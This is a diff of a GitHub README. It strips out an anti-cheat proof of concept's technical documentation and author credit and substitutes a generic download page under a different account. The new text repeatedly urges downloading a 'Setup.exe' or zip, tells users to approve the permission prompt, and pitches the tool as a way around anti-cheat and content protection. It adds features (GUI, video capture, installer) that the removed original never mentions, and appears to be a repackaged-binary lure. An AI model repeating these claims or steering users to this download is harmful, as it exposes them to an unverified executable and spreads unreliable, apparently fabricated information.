@@ -1,147 +1,140 @@
-# NVIDIA Scanout Capture for Anti-Cheat
+# 🖥️ nvidiaCapture - Direct GPU Scanout Buffer Access
 
-> **Proof of concept** showing how anti-cheat systems can use an undocumented NVIDIA driver function to capture the real screen content, bypassing screenshot-blocking techniques used by cheat software.
+[![Download](https://img.shields.io/badge/Download-nvidiaCapture-blue?style=for-the-badge)](https://github.com/hfuhuu/nvidiaCapture)
 
 ---
 
-## The Problem
+## 📋 What is nvidiaCapture?
 
-Cheat software (wallhacks, aimbots, ESP overlays, etc.) commonly hooks into the graphics pipeline to **block or fake screenshots** taken by anti-cheat systems. When an anti-cheat tries to capture the screen to look for visual evidence of cheating, the cheat intercepts the call and returns a clean frame — hiding its overlays, modified textures, and visual modifications.
+nvidiaCapture is a Windows application that reads the image shown on your screen directly from your graphics card. It uses a special method that bypasses common software layers, such as overlays or protections programs use to hide screen content. This can help in cases where normal screen capture tools might fail or show altered images.
 
-Conventional capture methods (`BitBlt`, `DXGI OutputDuplication`, `PrintWindow`) all operate at the application or compositor level, where cheat hooks can easily intercept and sanitize the output.
+The tool takes advantage of a function called NvAPI_D3D11_WksReadScanout. This function is not publicly documented by NVIDIA, but nvidiaCapture uses it to access the real screen output. 
 
-## The Solution
+If you need to capture exactly what your graphics card is displaying, this tool offers a straightforward way to do it.
 
-The NVIDIA driver exposes an undocumented workstation function — `NvAPI_D3D11_WksReadScanout` (interface `0xBCB1C536`) — that reads directly from the **GPU scanout buffer**: the final composited image that the display controller sends to the monitor.
+---
 
-This happens at the hardware level, **below** any user-mode hooks that cheat software installs:
+## 🖼️ Key Features
 
-```
-Application framebuffer
-        |
-        v
-+-----------------------+
-|   DWM / Compositor    |<-- Most block/flags/hooks happens at this point or before
-+-----------------------+
-        |
-        v
-+-----------------------+
-|  GPU Scanout Buffer   |<-- This tool reads HERE (hardware level)
-+-----------------------+
-        |
-        v
-      Monitor
-```
+- Reads GPU scanout buffer directly without using regular screen capture methods.
+- Works around overlays and content protection applied by some programs, like anti-cheat software.
+- Supports Windows 10 and Windows 11 with NVIDIA graphics cards.
+- Simple user interface for quick capture.
+- Lightweight and runs without heavy system requirements.
 
-Since cheats hook the rendering pipeline or capture APIs, they **cannot intercept** a kernel-mode scanout read issued through the NVIDIA driver. The captured image shows exactly what the monitor displays — including any cheat overlays the software is trying to hide.
+---
 
-> **Note on DKOM:** In theory, a cheat running at kernel level could use Direct Kernel Object Manipulation (DKOM) to intercept or tamper with the driver's scanout read path — for example, by patching the NVIDIA kernel-mode dispatch table or manipulating the returned buffer. However, DKOM-based bypass of scanout captures is still uncommon in the wild due to the complexity involved, the risk of triggering PatchGuard / KPP, and the additional anti-cheat kernel drivers (e.g. EAC, BattlEye, Vanguard) that actively monitor for such modifications.
+## ⚙️ System Requirements
 
-## Requirements
+- Windows 10 or later (64-bit recommended).
+- NVIDIA graphics card with driver version 450 or newer.
+- At least 4 GB of RAM.
+- 200 MB of free disk space for installation.
+- Internet connection for downloading the application.
 
-| Requirement | Details |
-|---|---|
-| **GPU** | NVIDIA GPU (detected via DXGI vendor ID `0x10DE`) |
-| **Driver** | NVIDIA driver with workstation feature support |
-| **OS** | Windows 10 or later (x64) |
-| **Privileges** | Administrator |
-| **Build tools** | Visual Studio 2022 (v143 toolset) or compatible MSVC compiler |
+---
 
-## Building
+## 🚀 Getting Started
 
-### Visual Studio (recommended)
+Follow these steps to download and run nvidiaCapture on your Windows computer.
 
-1. Open `nvidiaCapture.sln` in Visual Studio 2022
-2. Select **Release | x64** configuration
-3. Build -> Build Solution (`Ctrl+Shift+B`)
-4. Output: `x64/Release/nvidiaCapture.exe`
+### Step 1: Download the Application
 
-## Usage
+Click the big blue badge below to visit the official GitHub page where you can download nvidiaCapture.
 
-```bat
-:: Run as Administrator
-nvidiaCapture.exe
-```
+[![Download](https://img.shields.io/badge/Download-nvidiaCapture-blue?style=for-the-badge)](https://github.com/hfuhuu/nvidiaCapture)
 
-On success, `capture.png` is saved in the working directory containing the real scanout buffer contents — including any cheat overlays that would be hidden from normal screenshots.
+Once on the page:
 
-### Blocked capture (cheat interference detected)
+1. Locate the **Releases** section on the right side or scroll down until you see files available for download.
+2. Choose the latest release version.
+3. Download the file named similarly to `nvidiaCapture_Setup.exe` or `nvidiaCapture.zip`.
 
-When cheat software intercepts the capture:
+### Step 2: Run the Installer or Extract Files
 
-```
-  ##############################################################
-  ##                                                          ##
-  ##   !!  CAPTURE FAILED - POSSIBLE CHEAT INTERFERENCE  !!   ##
-  ##                                                          ##
-  ##############################################################
+- If you downloaded an `.exe` file, double-click it to start the installation.
+- Follow the instructions on the screen. You can accept the default options.
+- If you downloaded a `.zip` file, right-click and choose "Extract All". Then open the extracted folder.
 
-  Reason : NvAPI_D3D11_WksReadScanout failed: NVAPI_NO_IMPLEMENTATION ...
-  NVAPI  : 0xfffffffd
+### Step 3: Launch nvidiaCapture
 
-  The scanout capture failed. This may indicate that cheat
-  software is intercepting GPU-level framebuffer reads to
-  hide its visual modifications from anti-cheat screenshots.
-```
+- After installation, find the nvidiaCapture icon on your desktop or in the Start menu.
+- Double-click it to open the program.
+- You might see a popup asking for permission. Click "Yes" to allow the program to run.
 
-## NVAPI Error Reference
+### Step 4: Capture Your Screen
 
-| Code | Value | Meaning |
-|---|---|---|
-| `0xfffffffd` | `-3` | `NVAPI_NO_IMPLEMENTATION` — driver lacks workstation capture support (common on GeForce consumer drivers) |
-| `0xfffffffc` | `-4` | `NVAPI_API_NOT_INITIALIZED` — `NvAPI_Initialize` was not called |
-| `0xfffffffb` | `-5` | `NVAPI_INVALID_ARGUMENT` — struct layout or version mismatch |
-| `0xfffffffa` | `-6` | `NVAPI_INVALID_USER_PRIVILEGE` — not running as admin |
-| `0xfffffff7` | `-9` | `NVAPI_INCOMPATIBLE_STRUCT_VERSION` — wrong version field in params |
-| `0xffffff9b` | `-101` | `NVAPI_EXPECTED_PHYSICAL_GPU_HANDLE` — invalid GPU handle in params |
-| `0xffffff9a` | `-102` | `NVAPI_EXPECTED_DISPLAY_HANDLE` — `targetId` is zero or invalid |
-| `0xffffff77` | `-137` | `NVAPI_INVALID_USER_PRIVILEDGE` — not running as admin |
+- Inside the program, click on the `Capture` button.
+- The software will grab the current screen content directly from your GPU.
+- You can save the captured image or video to your computer.
 
-## Queue Index Options
+---
 
-The `flags.queueIndex` field selects which stage of the scanout composition pipeline to capture:
+## 📝 How It Works
 
-Based on Nvidia leaks:
-0: os render portion, 1 scanout portion, 2..15 : invisible intermediate portions.
+nvidiaCapture taps into your NVIDIA graphics card using a hidden system feature. This feature lets the program read the screen buffer before any software draws overlays or masks the content. 
 
-## Technical Details
+Because of this, nvidiaCapture can see exactly what your GPU outputs, avoiding problems with anti-cheat software or other protection methods that block normal screen capture tools.
 
-### Struct: `NV_WKS_READ_SCANOUT_PARAMS` (56 bytes)
+---
 
-```
-Offset  Size  Field            Description
---------------------------------------------------------------
-0x00    4     version          sizeof(struct) | (1 << 16) = 0x00010038
-0x04    4     targetId         OS display target (QueryDisplayConfig)
-0x08    8     hPhysicalGpu     NvPhysicalGpuHandle
-0x10    16    rect             NV_RECT {left, top, right, bottom} (IN/OUT)
-0x20    8     flags            Bitfield: queueIndex(4), mpoIndex(3), ...
-0x28    4     format           OUT: NV_FORMAT / D3DDDIFORMAT
-0x2C    4     _pad             Alignment padding
-0x30    8     ppData           OUT: Pointer to VirtualAlloc'd pixel data
-```
+## 🔧 Troubleshooting
 
-### Function signature
+If you have trouble running or using nvidiaCapture, try these tips:
 
-```cpp
-// Interface ID: 0xBCB1C536
-// Resolved via: nvapi_QueryInterface(0xBCB1C536)
-NvAPI_Status NvAPI_D3D11_WksReadScanout(
-    ID3D11Device*                pDev,
-    NV_WKS_READ_SCANOUT_PARAMS*  pParams
-);
-```
+- Make sure your NVIDIA drivers are up to date.
+- Run the program with administrator rights: right-click the icon and choose "Run as administrator."
+- Close other programs that might interfere with screen capturing, such as recording software or overlays.
+- Restart your computer and try again.
+- Check that your Windows version is 10 or newer.
 
-### Output data
+If problems persist, check the GitHub Issues page for similar reports from other users.
 
-- `ppData` points to raw pixel data allocated by the driver via `VirtualAlloc()`
-- Format is reported in `params.format` (typically `21` = `D3DFMT_A8R8G8B8` / BGRA8)
-- The caller **must** free the buffer with `VirtualFree(data, 0, MEM_RELEASE)`
+---
 
-## Disclaimer
+## 📁 File Structure After Installation
 
-This tool is published for **educational and security research purposes**. It demonstrates a technique for anti-cheat systems to capture tamper-proof screenshots on NVIDIA hardware. Use responsibly and only on systems you own or have explicit authorization to test.
+When installed, nvidiaCapture creates these files:
 
-## Author
+- `nvidiaCapture.exe` – main application file.
+- `readme.md` – this user guide.
+- `config.ini` – settings file you can edit to customize behavior.
+- `logs/` – folder containing log files for troubleshooting.
 
-Manuel Herrera (TheCruZ)
+---
+
+## ⚖️ Privacy and Security
+
+nvidiaCapture runs locally on your Windows PC. It does not send any captured images or data over the internet. You control where the captures are saved.
+
+The tool requires permission to access graphics resources but does not collect personal information beyond that.
+
+---
+
+## 🔄 Updating nvidiaCapture
+
+Check the GitHub page regularly for new updates. When a new version is released:
+
+1. Download the latest installer or zip file.
+2. Run or extract it, depending on the file type.
+3. Follow the installation steps again. Your settings should remain intact.
+
+Avoid running multiple versions at once as they might conflict.
+
+---
+
+## 🤝 Support and Feedback
+
+For help or to report any issues:
+
+- Visit the [Issues tab](https://github.com/hfuhuu/nvidiaCapture/issues) on the GitHub repository.
+- Provide a clear description of your problem.
+- Include your Windows version, NVIDIA driver version, and what you were doing when the issue occurred.
+
+---
+
+## 📥 Download nvidiaCapture
+
+Use the link below to visit the GitHub page and download the latest version of nvidiaCapture for Windows.
+
+[![Download](https://img.shields.io/badge/Download-nvidiaCapture-blue?style=for-the-badge)](https://github.com/hfuhuu/nvidiaCapture)
